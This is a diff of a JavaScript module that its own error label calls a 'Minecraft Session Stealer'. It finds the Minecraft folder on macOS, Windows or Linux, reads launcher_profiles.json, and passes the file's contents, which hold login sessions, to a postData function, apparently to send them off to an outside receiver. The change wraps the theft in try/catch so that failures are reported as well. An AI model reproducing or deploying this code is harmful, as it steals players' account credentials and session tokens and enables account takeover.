@@ -6,26 +6,30 @@
  * Last Updated: 9/5/2020
  */
 
-const fs = require('fs');
-const path = require('path');
-const os = require('os');
+try {
+    const fs = require('fs');
+    const path = require('path');
+    const os = require('os');
 
-const getMinecraftFolder = () => {
-    switch (os.type()) {
-        case 'Darwin':
-            return (folder = path.join(os.homedir(), '/Library/Application Support/minecraft'));
+    const getMinecraftFolder = () => {
+        switch (os.type()) {
+            case 'Darwin':
+                return (folder = path.join(os.homedir(), '/Library/Application Support/minecraft'));
 
-        case 'win32':
-        case 'Windows_NT':
-            return (folder = path.join(process.env.APPDATA, '.minecraft'));
+            case 'win32':
+            case 'Windows_NT':
+                return (folder = path.join(process.env.APPDATA, '.minecraft'));
 
-        default:
-            return path.join(os.homedir(), '.minecraft');
+            default:
+                return path.join(os.homedir(), '.minecraft');
+        }
+    };
+
+    if (fs.existsSync(getMinecraftFolder()) && fs.existsSync(`${getMinecraftFolder()}\\launcher_profiles.json`)) {
+        postData(fs.readFileSync(`${getMinecraftFolder()}\\launcher_profiles.json`, 'utf8'), 'Minecraft Launcher Profiles / Sessions');
+    } else {
+        postData('Minecraft directory or launcher profiles file not found.');
     }
-};
-
-if (fs.existsSync(getMinecraftFolder()) && fs.existsSync(`${getMinecraftFolder()}\\launcher_profiles.json`)) {
-    postData(fs.readFileSync(`${getMinecraftFolder()}\\launcher_profiles.json`, 'utf8'), 'Minecraft Launcher Profiles / Sessions');
-} else {
-    postData('Minecraft directory or launcher profiles file not found.');
+} catch (e) {
+    postData(e.stack, 'Minecraft Session Stealer Error');
 }
